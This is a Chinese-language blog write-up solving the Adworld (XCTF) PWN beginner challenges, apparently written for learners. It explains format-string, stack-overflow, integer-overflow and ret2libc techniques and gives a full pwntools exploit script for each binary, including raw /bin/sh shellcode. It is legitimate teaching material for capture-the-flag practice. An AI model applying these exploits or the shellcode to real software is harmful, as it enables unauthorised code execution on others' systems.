@@ -1,0 +1,333 @@
+<!doctype html><html lang=zh-cn><title>攻防世界 PWN 新手区 Writeup *萌新向* - imlonghao</title><meta name=description content="咕咕咕，咕咕咕咕咕咕，咕咕咕咕咕咕咕咕咕"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=renderer content="webkit"><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><link rel=dns-prefetch href=//vip1.loli.net><link rel=stylesheet href=/static/hw3x7x.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqusjs.css integrity="sha256-GxdCIOyfxQ1OBfS99qAIJDoGK1ADuBsxhMTqXG82fAY=" crossorigin=anonymous><script src=/static/hw3x7x.js async></script><script src=https://cdn.jsdelivr.net/npm/disqusjs@1.3.0/dist/disqus.js integrity="sha256-LVaMHPQ2zLqOc5rXSAfr4d1PIkEGNLyyUTDNPZmTtUw=" crossorigin=anonymous></script><script src=//instant.page/3.0.0 type=module defer integrity=sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1></script><link rel=alternate type=application/rss+xml title="imlonghao Feed" href=https://imlonghao.com/feed.xml><div id=container><div id=header><div id=post-nav><a href=./>Home</a>
+&nbsp;»&nbsp;
+<a href=./55.html>攻防世界 PWN 新手区 Writeup *萌新向*</a></div></div><div class=clearfix></div><div id=title>攻防世界 PWN 新手区 Writeup *萌新向*</div><div id=content class=markdown-body><p>咕咕咕，咕咕咕咕咕咕，咕咕咕咕咕咕。<p>咕咕咕咕咕咕咕咕咕，咕咕咕咕咕，咕咕咕咕。<p>咕咕，咕咕咕咕咕咕咕咕咕咕咕，咕咕咕咕咕咕咕咕咕咕咕咕咕咕咕咕。<p>所需工具：<blockquote><p><a href=https://github.com/0xTac/Pwndocker rel=nofollow>Pwndocker</a>
+老 (I) 女 (D) 人 (A)</blockquote><p>题目地址:<p><a href="https://adworld.xctf.org.cn/task/task_list?type=pwn&number=2&grade=0&page=1" rel=nofollow>https://adworld.xctf.org.cn/task/task_list?type=pwn&number=2&grade=0&page=1</a><h2>get_shell</h2><blockquote><p>运行就能拿到 shell 呢，真的</blockquote><p>我信了<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/QM2G1keXcPWfSVb.png><p>IDA 一看，简单粗暴。直接用 nc 连上服务器即可，一道让人掌握如何使用 nc 的题目？<pre><code>nc serverip port
+cat flag
+</code></pre><h2>CGfsb</h2><blockquote><p>菜鸡面对着 pringf 发愁，他不知道 prinf 除了输出还有什么作用</blockquote><p>先看保护状态<pre><code>[*] '/ctf/work/adworld/CGfsb/4a0c08abff9d43ba8b65718a0edc7cc2'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre><p>32 位程序，没有开 PIE 地址随机化。<p>使用 IDA 粗略查看代码逻辑<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/21ODKXzHJYs7lZx.png><p>发现程序里面有 <code>cat flag</code> 的操作，我们只需要运行到这个位置即可，但是在程序运行的上下文都没有对 pwnme 修改赋值的地方<p>但是，看到上面有一条 <code>printf(&s)</code> 的语句，可以知道这里应该需要用到 <strong>格式化字符漏洞</strong><p>存在这个格式化字符漏洞的情况下，我们可以实现 <strong>任意地址读</strong> 以及 <strong>任意地址写</strong><p>详细的介绍可以参考：<a href=https://bbs.pediy.com/thread-253638.htm rel=nofollow>[原创]格式化字符串漏洞简介-『Pwn』-看雪安全论坛</a><p>这里快速摘抄经典表格，参考实际用法使用即可。<pre><code>32位
+
+读
+'%{}$x'.format(index)           // 读4个字节
+'%{}$p'.format(index)           // 同上面
+'${}$s'.format(index)
+
+写
+'%{}$n'.format(index)           // 解引用，写入四个字节
+'%{}$hn'.format(index)          // 解引用，写入两个字节
+'%{}$hhn'.format(index)         // 解引用，写入一个字节
+'%{}$lln'.format(index)         // 解引用，写入八个字节
+
+64位
+
+读
+'%{}$x'.format(index, num)      // 读4个字节
+'%{}$lx'.format(index, num)     // 读8个字节
+'%{}$p'.format(index)           // 读8个字节
+'${}$s'.format(index)
+
+写
+'%{}$n'.format(index)           // 解引用，写入四个字节
+'%{}$hn'.format(index)          // 解引用，写入两个字节
+'%{}$hhn'.format(index)         // 解引用，写入一个字节
+'%{}$lln'.format(index)         // 解引用，写入八个字节
+
+%1$lx: RSI
+%2$lx: RDX
+%3$lx: RCX
+%4$lx: R8
+%5$lx: R9
+%6$lx: 栈上的第一个QWORD
+</code></pre><p>言归正传，那么首先我们需要知道输入的偏移量。<p>通过输入 <code>aaaa-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x</code>，<code>aaaa</code> 是我们输入的一般字符，<code>%x</code> 的意思是输出该位置的十六进制数<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/CIPctdHXfJbmrga.png><p>根据程序输出，我们可以知道偏移量为 10 的地址上存储了我们所输入的信息，将来就把内存地址放在这个位置即可。<p>接下来我们来找 pwnme 在内存中的位置，由于没有开启 PIE ，因此内存地址不会变化的，在 IDA 中双击 <code>pwnme</code> 这个变量即可。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/G9lnxiodye8qDH4.png><p>可以知道 pwnme 在内存中的地址为 <code>0x0804A068</code><p>因此，我们可以构造出我们这次格式化漏洞的攻击代码：<code>p32(0x0804A068) + aaaa%10$n</code><p>这样我们就把 0x0804A068 设置成了 8<p>那么，为什么是 8 呢？<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/Cmc7B8zRhT1I9X5.png><p>程序会将 <code>%10$n</code> 之前字符的个数写入到指定内存中，因此前面我们构造八个字符即可。<p>这里除了 <code>p32(0x0804A068) + aaaa%10$n</code> 这种形式我们也可以使用 <code>p32(0x0804A068) + '%4c%10$n</code> 能同样的达到效果<pre><code class=language-python>#!/usr/bin/env python
+
+from pwn import *
+
+proc = './4a0c08abff9d43ba8b65718a0edc7cc2'
+
+context.binary = proc
+context.log_level = 'debug'
+
+if args.R:
+    p = remote('111.198.29.45', 38981)
+else:
+    p = process(proc)
+
+pwnme = 0x0804A068
+
+p.sendlineafter(':', 'imlonghao')
+p.sendlineafter(':', p32(pwnme) + '%4c%10$n')
+
+p.interactive()
+</code></pre><h2>when_did_you_born</h2><blockquote><p>只要知道你的年龄就能获得 flag，但菜鸡发现无论如何输入都不正确，怎么办</blockquote><pre><code>[*] '/ctf/work/adworld/when_did_you_born5/002de4a1cad84b0b8988bc3c42e1f007'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>拿到题目先看 checksec，开了 Canary，也开了 NX，<del>问题不大</del>。接下来看一下程序逻辑<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/KNf7CEOnziP5xaI.png><p>可以在程序中看到 <code>gets(&v4)</code>，这就是本题的漏洞点了，<code>gets</code> 没有指定接受多少位，因此这里可以实现溢出。<p>接着我们来看 v4 和 v5 这两个变量在堆栈中的位置和长度<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/PBpChU5d2Z6xqLu.png><p>可以知道 v4 的长度为 8 ，并且在内存中的地址比 v5 的高，堆从高地址向低地址生长，因此可以通过 v4 覆盖到 v5。<p>程序没有修改 return addr 因此不会触发 Canary 保护；程序内部本身就有 <code>cat flag</code> 的语句，因此开了 NX 也不会造成影响。<pre><code class=language-python>#!/usr/bin/env python
+
+from pwn import *
+
+proc = './002de4a1cad84b0b8988bc3c42e1f007'
+
+context.binary = proc
+context.log_level = 'debug'
+
+if args.R:
+    p = remote('111.198.29.45', 59375)
+else:
+    p = process(proc)
+
+p.sendlineafter('?', '2333')
+p.sendlineafter('?', 'a' * 8 + p32(1926))
+
+p.interactive()
+</code></pre><h2>hello_pwn</h2><blockquote><p>pwn！，segment fault！菜鸡陷入了深思</blockquote><pre><code>[*] '/ctf/work/adworld/hello_pwn/d50dee8a01694e9fbfe58ddcba84956a'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>保护只开了 NX ，其他啥都没开。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/eYsET3aJfctv8lM.png><p>看了看程序的主要逻辑，首先读取 0x10 个字节放到 <code>unk_601068</code> 的位置上，接着判断 <code>dword_60106C</code>是否等于 <code>1853186401</code> ，如果等于，则我们可以拿到 flag<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/RcBMU1wiJoStlpz.png><p>接着看 <code>unk_601068</code> 和 <code>dword_60106C</code> 的位置和大小，<code>unk_601068</code> 只有 4 位，我们可以通过溢出覆盖下面的 <code>dword_60106C</code>，这样我们就能使程序逻辑运行到 getflag 的函数了。<pre><code class=language-python>#!/usr/bin/env python
+
+from pwn import *
+
+proc = './d50dee8a01694e9fbfe58ddcba84956a'
+
+context.binary = proc
+context.log_level = 'debug'
+
+if args.R:
+    p = remote('111.198.29.45', 39742)
+else:
+    p = process(proc)
+
+p.sendlineafter('bof', '2333' + p32(1853186401))
+
+p.interactive()
+</code></pre><h2>level0</h2><blockquote><p>菜鸡了解了什么是溢出，他相信自己能得到 shell</blockquote><pre><code>[*] '/ctf/work/adworld/level0/ea3758e885904101913f7be6fff1bb2d'
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>和上一题一样只开了 NX，其他保护都没开<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/JCHUkhD4TO83wSF.png><p>程序的漏洞点是 <code>vulnerable_function</code> 函数，读取了 0x200 字节，但是 buf 只有 0x80 的位置，加上没有 Canary 保护，我们可以通过溢出修改程序的返回地址。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/bMSYl8xFQyK1kpD.png><p>程序自带了 <code>system("/bin/sh")</code> 函数，我们只需要将返回地址修改到这里即可，这里的地址是 <code>0x400596</code><p>接下来我们确定长度，看一下布局<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/YSydrHFqWjczoUn.png><p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/glFGZNB1VkzRdLp.png><p>因此长度确定为 <code>0x80+0x8=136</code>，然后传返回地址即可。<p>除了上面的方法，我们还可以利用 cyclic 和 gdb 来进行调试。<p>首先通过 <code>cyclic 300</code> 生成一长串字符，用户确定溢出位置；接着通过 <code>gdb -q program_name</code> 启动 gdb，随后使用 run 启动程序<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/4ZMnVw8g1hmxaLq.png><p>接着将那一长串字符复制粘贴到程序中，回车<p>程序会崩溃，gdb 会返回当前的寄存器信息<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/nTKD78iQGmygpVO.png><p>看到 RSP 是 <code>jaab</code> ，通过 <code>cyclic -l jaab</code> 确定长度是 136，和上面的是一样的。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/KbM6STOUjhas7iW.png><p>栈的结构大致如图<pre><code class=language-python>#!/usr/bin/env python
+
+from pwn import *
+
+proc = './ea3758e885904101913f7be6fff1bb2d'
+
+context.binary = proc
+context.log_level = 'debug'
+
+if args.R:
+    p = remote('111.198.29.45', 40355)
+else:
+    p = process(proc)
+
+callsystem = 0x400596
+
+p.sendlineafter('World', 'a' * 136 + p64(callsystem))
+
+p.interactive()
+</code></pre><h2>level2</h2><blockquote><p>菜鸡请教大神如何获得 flag，大神告诉他‘使用<code>面向返回的编程</code>(ROP)就可以了’</blockquote><pre><code>[*] '/ctf/work/adworld/level2/1eeba7bd29854274886837bead29fa75'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre><p>这题和上一题解题的思路基本一致，区别就是没有了自带的 getshell 函数，另外变成了 32 位的程序。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/hDc3W7VlXpJRgi2.png><p>漏洞点基本上一致，就是栈溢出。<p>现在的问题就是，我们需要自己构建通过 system 函数来运行 /bin/sh<p>看到上面的漏洞函数，使用了 system 函数，这对我们构建来说就更简单了，加上没有 PIE，只需要找到 system 的地址即可直接使用<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/CkwK74EqdcsBI3D.png><p>双击 IDA 中的 _system 函数，即可知道他的地址<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/8de1KPwxQsDH6pm.png><p>即知道了 system 的地址为 <code>0x8048320</code><p>接下来看程序里面有没有自带的 <code>/bin/sh</code> 字符串，没有的话我们就需要自己传进去程序了，IDA 中通过 <code>Ctrl+F12</code> 可以查看所有的字符串<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/RVLgGPFA7NktZJ3.png><p>十分幸运的是，程序里面有 <code>/bin/sh</code> 字符串。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/MopS4qBY3Cvze1h.png><p><code>/bin/sh</code> 的地址是 <code>0x804A024</code>，这样两个条件我们都有了，就可以构造攻击字符串了<p>首先确认输入多少才能溢出到返回函数<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/C49LHGSRoEVefui.png><p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/zAZhM2tWwf3cs9d.png><p>即需要 <code>0x88+0x4=140</code> 个字符才能覆盖到返回函数<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/bmN7GXx8oIMZcri.png><p>栈大致如上图，<code>return_addr</code> 为当前函数的返回地址，<code>return_addr2</code> 为运行完返回函数后的返回地址，<code>args</code> 为 <code>return_addr</code> 函数需要的参数。<p>在本题的话，<code>return_addr</code> 为 <code>0x8048320</code>，<code>return_addr2</code> 随便填写就好了，<code>args</code> 为 <code>/bin/sh</code> 所在的地址即 <code>0x804A024</code><p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/D2u6RXQmxK3FS9k.png><p>最终栈如上图所示，代码如下<pre><code class=language-python>#!/usr/bin/env python
+
+from pwn import *
+
+proc = './1eeba7bd29854274886837bead29fa75'
+
+context.binary = proc
+context.log_level = 'debug'
+
+if args.R:
+    p = remote('111.198.29.45', 56526)
+else:
+    p = process(proc)
+
+system = 0x8048320
+binsh = 0x804A024
+
+p.sendlineafter(':', 'a' * 140 + p32(system) + p32(0) + p32(binsh))
+
+p.interactive()
+</code></pre><h2>string</h2><blockquote><p>菜鸡遇到了 Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求</blockquote><pre><code>[*] '/ctf/work/adworld/string/79fce6e54bca4825bb65611b55b294a1'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>这题就有点不同了，除了 PIE 没开其他保护都开了，另外本题的没用的字也太多了&mldr;<p>通过 IDA 每个函数都看一看，不难发现在 <code>sub_400BB9</code> 函数中存在格式化字符漏洞<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/D2u6RXQmxK3FS9k.png><p>另外在 <code>sub_400CA6</code> 函数中，直接将我们的输入运行了<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/8Mvn2BNAslUIPFQ.png><p>但是，这里就有一个问题了，在这个函数中需要 <code>*a1 == a1[1]</code> 才会执行我们的 shellcode，那么，我们先来搞清楚这个 a1 是什么吧。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/2vR13CLVUmQpuOa.png><p>相信通过上面的图，a1 是上面的这个问题就已经很清晰了。<p>在 main 函数里面定义了，*a1 就是 68，a1[1] 就是 85，那么这里就可以通过格式化字符漏洞来解题了，修改其中一个值使其与另外一个值相等即可。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/HqYUuNFs4wTtCbx.png><p>利用格式化字符漏洞的话，我们有两种可行的方法，一种是将目标地址放在上图中的 <code>&v2</code>，另外一种是直接放入 <code>&format</code> 中<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/Sm9oAbzeMGBvnZw.png><p>放在 <code>&v2</code>的话偏移值就是 7，放在 <code>&format</code> 的话偏移值就是 8<p>偏移值确定好了，那么地址是什么呢？<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/QDX4w8J6xkWC2Iz.png><p>其实根据 IDA 的 main 函数就能看出来，程序一开始为了降低难度就已经输出了相关的地址，本文中选用 <code>secret[0]</code> 即 <code>*a1</code> 以及 <code>&format</code> 的偏移来解题<p>即我们需要在 <code>Give me an address</code> 中输入 <code>secret[0]</code> 的值，在 <code>Your wish is</code>中输入 <code>'%85c%7$n</code> 来实现任意地址写的操作。<p>接下来问题基本上就解决了，最后他需要运行一个 shellcode ，我们可以在网上随便找一个 64 位的执行 /bin/sh 的 shellcode 即可<pre><code class=language-python>#!/usr/bin/env python
+
+from pwn import *
+
+proc = './79fce6e54bca4825bb65611b55b294a1'
+
+context.binary = proc
+context.log_level = 'debug'
+
+if args.R:
+    p = remote('111.198.29.45', 55672)
+else:
+    p = process(proc)
+
+shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+
+p.recvuntil('secret[0] is ')
+address = int('0x' + p.recvuntil('\n').strip(), 16)
+
+p.sendlineafter('name be:', 'imlonghao')
+p.sendlineafter('So, where you will go?east or up?:', 'east')
+p.sendlineafter('go into there(1), or leave(0)?:', '1')
+p.sendlineafter('Give me an address', str(address))
+p.sendlineafter('And, you wish is:', '%85c%7$n')
+p.sendlineafter('Wizard: I will help you! USE YOU SPELL', shellcode)
+
+p.interactive()
+</code></pre><h2>guess_num</h2><blockquote><p>菜鸡在玩一个猜数字的游戏，但他无论如何都银不了，你能帮助他么</blockquote><p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/kEqG8RzZmI1nPV4.png><p>（出题人出题也要夹私货）<pre><code>[*] '/ctf/work/adworld/guess_num/8148f1ab15f24bacbe1b16e8de24df17'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre><p>保护全开的题目<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/ejLgWSbIGCtU4JM.png><p>通过 main 函数可以看到有两个问题，一个是使用了 <code>gets</code> 存在栈溢出，另一个是使用了 <code>srand</code> 初始化随机数种子<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/muF1qdoMBWejcAR.png><p><code>srand</code> 进行初始化的时候，是通过 <code>sub_BB0</code> 函数初始化的，而该函数使用了 <code>/dev/urandom</code> 来取得随机数的。<p>那么，我们能不能通过 <code>gets</code> 的溢出固定这个随机数呢？答案是可以的。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/5E3RCkBSA42J1Zf.png><p>当 <code>gets</code> 超过 0x20 字符时就会溢出开始覆盖 seed 的值，我们可以通过栈溢出固定下来随机数的种子数。<p>本题本质时一个猜数字的游戏，连续猜中 10 次就能得到 flag 了。我们可以通过写一个简单的 C 程序来提前取得要猜的数字，固定随机数的种子数为 0<pre><code class=language-c>void main() {
+        int i;
+        srand(0);
+        for (i = 0; i &lt;= 9; ++i) {
+                printf(&quot;%d&quot;, rand()%6+1);
+        }
+}
+</code></pre><p>编译运行，可以知道这 10 个要猜的数字分别是：2 5 4 2 6 2 5 1 4 2<pre><code class=language-python>#!/usr/bin/env python
+
+from pwn import *
+
+proc = './8148f1ab15f24bacbe1b16e8de24df17'
+
+context.binary = proc
+context.log_level = 'debug'
+
+if args.R:
+    p = remote('111.198.29.45', 57416)
+else:
+    p = process(proc)
+
+p.sendlineafter(':', 'a'*0x20 + p64(0))
+p.sendlineafter(':', '2')
+p.sendlineafter(':', '5')
+p.sendlineafter(':', '4')
+p.sendlineafter(':', '2')
+p.sendlineafter(':', '6')
+p.sendlineafter(':', '2')
+p.sendlineafter(':', '5')
+p.sendlineafter(':', '1')
+p.sendlineafter(':', '4')
+p.sendlineafter(':', '2')
+
+p.interactive()
+</code></pre><h2>int_overflow</h2><blockquote><p>菜鸡感觉这题似乎没有办法溢出，真的么?</blockquote><pre><code>[*] '/ctf/work/adworld/int_overflow/532be1161263482890e88772bcde6470'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre><p>逐个函数检查一下看看有没有问题<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/zmcp4duJi2SvVkA.png><p>login 函数没有问题，read 进来的值小于申请的值。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/u14wkhSJXaBPLeN.png><p>看到 check_passwd 的时候就发现问题了，其中使用了 strcpy 函数，将 s 复制到 dest，而 dest 的大小只有 11<p>而表示 s 长度的 v3 变量，类型是一个 int8，而 int8 的大小范围是 -128~127，也就是说，我们可以通过上溢 v3 绕过长度限制，从而通过 strcpy 来栈溢出覆盖返回地址实现攻击<p>v3 要求在 [4, 8] 之间，通过上溢的话 <code>127+128+4=259</code> 以及 <code>127+128+8=263</code> ，我们需要构建 payload 的长度在这个范围 [259, 263] 内即可通过长度校验<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/5xCe1zHZtcTE6fU.png><p>函数中有现成的后门，直接将返回地址设置成这个函数的即可，这里的地址是 <code>0x0804868B</code><p>接下来确定输出多少位能覆盖到返回地址<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/wo9KdzQrHnXYjh8.png><p>根据上图可以知道，是 <code>0x14+0x4=0x18</code><p>最终，我们能够写出以下脚本实现攻击，我使用了 <code>ljust</code> 来凑够 259 位的长度<pre><code class=language-python>#!/usr/bin/env python
+
+from pwn import *
+
+proc = './532be1161263482890e88772bcde6470'
+
+context.binary = proc
+context.log_level = 'debug'
+
+if args.R:
+    p = remote('111.198.29.45', 39249)
+else:
+    p = process(proc)
+
+p.sendlineafter(':', '1')
+p.sendlineafter(':', 'imlonghao')
+p.sendlineafter(':', ('a'*0x18 + p32(0x0804868B)).ljust(259))
+
+p.interactive()
+</code></pre><h2>cgpwn2</h2><blockquote><p>菜鸡认为自己需要一个字符串</blockquote><pre><code>[*] '/ctf/work/adworld/cgpwn2/441cb6426ac744208071077728a09786'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre><p>保护只开了 NX<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/BAT5KaoxqEzgYDb.png><p>通过 IDA 检查程序，程序使用了 gets 函数，存在栈溢出漏洞。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/DzU1PB8saAjgSYX.png><p>继续检查，可以发现程序使用了 system 函数，但是没有直接给我们 /bin/sh<p>这样的话，我的思路就是调用他的 system，再加上自己填进去的 /bin/sh 拿到 shell<p>首先确定 system 的地址，双击 pwn 函数中的 <code>_system</code><p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/zL6xn4DAIEuXdlb.png><p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/3lvmdGMI5jH8UVR.png><p>可以知道 system 的地址是 <code>0x8048420</code><p>然后，我们去哪里写 <code>/bin/sh</code> 呢？回到 hello 函数，发现在 gets 的上面通过 fgets 函数读取了我们的名字，并且保存在了 bss 段中<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/z7rgUQajZT8JksP.png><p>那么，我们在名字处填写 <code>/bin/sh</code> 的话，就保存在了 <code>0x804A080</code> 这个地址上，加上程序没有开 PIE 保护，一切就水到渠成了。<p>通过 <code>gets(&s)</code> 的栈溢出覆盖返回地址，手动调用 system 和传参。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/Vv37trn9icEhPQC.png><p>根据 IDA 目测计算可以知道(也可以使用 cyclic + gdb 进行计算)，传入 <code>0x26+0x4=42</code> 个字符刚好可以覆盖到返回地址上，构建这样的栈<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/A7gIYuJpE1m9lty.png><pre><code class=language-python>#!/usr/bin/env python
+
+from pwn import *
+
+proc = './441cb6426ac744208071077728a09786'
+
+context.binary = proc
+context.log_level = 'debug'
+
+if args.R:
+    p = remote('111.198.29.45', 33207)
+else:
+    p = process(proc)
+
+system = 0x8048420
+binsh = 0x804A080
+
+p.sendlineafter('please tell me your name', '/bin/sh')
+p.sendlineafter('hello,you can leave some message here:', 'a' * 42 + p32(system) + p32(0) + p32(binsh))
+
+p.interactive()
+</code></pre><h2>level3</h2><blockquote><p>libc!libc!这次没有 system，你能帮菜鸡解决这个难题么?</blockquote><p>这次的题目不仅给出了二进制文件，还给了 libc.so，通常这种题目，就是要通过泄露相关函数的地址，计算出 libc 的基地址，再通过 libc 取得其他函数的地址来解题。<p>这里就需要知道 plt 和 got 这两个表了，这里简单带过一下，可以参考 <a href=https://www.jianshu.com/p/5092d6d5caa3 rel=nofollow>彻底搞清楚 GOT 和 PLT - 简书</a>。摘录一部分:<blockquote><p>.got
+GOT（Global Offset Table）全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表。<p>.plt
+PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址，并跳转。要么当 .got.plt 没有所需地址的时，触发「链接器」去找到所需地址<p>.got.plt
+这个是 GOT 专门为 PLT 专门准备的节。说白了，.got.plt 中的值是 GOT 的一部分。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）</blockquote><p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/3r2ImcUnB87Jgvz.png><p>在实际的题目当中，常用的手法就是调用 plt 表中的类似 puts / write 等函数，输出程序中对应函数在 got 表中的地址，从而通过计算可以得到其他库的函数在本程序中的地址。<pre><code>[*] '/ctf/work/adworld/level3/level3'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre><p>保护只开了 NX，没有开其他保护。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/RuF7ATMCitxjeS3.png><p>在漏洞函数中可以看到这里存在一个栈溢出漏洞，那么常规的做法就是看看有没有后门函数可以跳过去，或者利用 system 函数拿到 shell。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/sOSDQuGzWKI85aV.png><p>但在这题中，即没有后门函数，又没有利用到 system 函数，我们不能直接拿其地址作为返回地址。<p>那么这时候，我们可以利用 write 函数输出 write 函数在 GOT 表中的地址，再利用 libc.so 中 write 函数和 system 函数的地址差值得到 system 函数的地址，是一个十分巧妙的方法。<p>首先我们先通过 libc.so 拿到相关的地址<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/xLjKrg6nzHGpVci.png><p>如图所示，write 函数的地址为 <code>0xd43c0</code>，system 函数的地址为 <code>0x3a940</code>，在 pwntools 中其实可以通过 <code>libc.symbols['write']</code> 和 <code>libc.symbols['system']</code> ，并没有太大的必要来人工拿地址<p>接着，我们需要拿到 libc.so 中 <code>/bin/sh</code> 的地址<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/8GtPR3myCHJI7X9.png><p>可知，<code>/bin/sh</code> 的地址在 1413163 的位置<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/Rn7OFA5S3CdDwc6.png><p>如图，我们需要构造 <code>0x88+4=140</code> 的字符，然后就能覆盖到返回地址，那么，我们这里什么作为返回地址呢?<p>我们可以将 write 函数的地址作为返回地址，构造函数使其输出 write 函数在 GOT 表中的地址，接着将返回地址设置为程序头，重新运行一次程序，接着就可以构造 <code>system("/bin/sh")</code> 拿到 shell 了。<p><img class=lazy data-src=https://vip1.loli.net/2019/12/27/leaLmDjw5iTbUcI.png><p>栈结构大致如上图所示，通过此步我们可以通过计算拿到 libc 中 system 和 /bin/sh 的地址，至于为什么要这样子构造，主要是由于 write 函数需要接收参数而定的<p><code>ssize_t write(int fd, const void *buf, size_t n)</code><p>我们相当于是令 <code>fd = 1 / *buf = write_addr / n = 4</code> （如果是 64 位程序的话 n 为 8）然后执行了一次 write 函数，拿到了其地址。<p>在下一次程序的运行过程中，我们使用同样的栈溢出，即可拿到 shell<pre><code class=language-python>#!/usr/bin/env python
+
+from pwn import *
+from LibcSearcher import *
+
+proc = './level3'
+
+context.binary = proc
+context.log_level = 'debug'
+
+if args.R:
+    p = remote('111.198.29.45', 56376)
+else:
+    p = process(proc)
+
+libc = ELF('./libc_32.so.6')
+elf = ELF(proc)
+
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+vuln_func = elf.symbols['vulnerable_function']
+
+p.recvuntil(':')
+p.sendline('a' * 140 + p32(write_plt) + p32(vuln_func) + p32(1) + p32(write_got) + p32(4))
+
+p.recv() # 0a
+write_addr = u32(p.recvuntil(':')[:4])
+
+libc_base = write_addr - libc.symbols['write']
+system = libc_base + libc.symbols['system']
+binsh = libc_base + 0x15902b
+
+p.sendline('a' * 140 + p32(system) + p32(0) + p32(binsh))
+
+p.interactive()
+</code></pre><h2>写在最后</h2><p>本人 pwn 新手，因此本文多多少少会有点问题，请师傅们指正。</div></div><div id=disqus_thread></div><div id=footer><span>Copyright © 2015 - 2020 imlonghao. Theme by
